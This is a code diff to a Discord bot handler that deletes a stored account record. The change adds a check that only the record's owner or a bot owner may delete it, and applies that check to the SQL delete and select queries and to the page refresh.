@@ -1,17 +1,24 @@
 const { queryParams } = require("../../../db/database");
 const accountsmsg = require("../../../autosecure/utils/accounts/accountsmsg");
+const isOwner = require("../../../db/isOwner");
 
 module.exports = {
     name: "deletefinal",
     callback: async (client, interaction) => {
         let [t, id, current, uid] = interaction.customId.split("|"); // Extract UID from customId
-        current = parseInt(current);
+        current = parseInt(current) || 1;
 
+        const isUserOwner = await isOwner(interaction.user.id);
+        if (id && interaction.user.id !== id && !isUserOwner) {
+            return interaction.reply({ content: "You do not have permission to delete this account.", ephemeral: true });
+        }
+
+        const effectiveUserId = isUserOwner ? id : interaction.user.id;
         // Delete the account by UID
-        await queryParams(`DELETE FROM accountsbyuser WHERE user_id=? AND uid=?`, [id, uid]);
+        await queryParams(`DELETE FROM accountsbyuser WHERE user_id=? AND uid=?`, [effectiveUserId, uid]);
 
         // Fetch remaining accounts to check if the current page is still valid
-        const remainingAccounts = await queryParams(`SELECT * FROM accountsbyuser WHERE user_id=?`, [id]);
+        const remainingAccounts = await queryParams(`SELECT * FROM accountsbyuser WHERE user_id=?`, [effectiveUserId]);
 
         // If no accounts remain, reset current to 1
         if (remainingAccounts.length === 0) {
@@ -22,6 +29,6 @@ module.exports = {
         }
 
         // Return to the accounts message with the updated current page
-        return interaction.update(await accountsmsg(id, current));
+        return interaction.update(await accountsmsg(effectiveUserId, current));
     }
 };
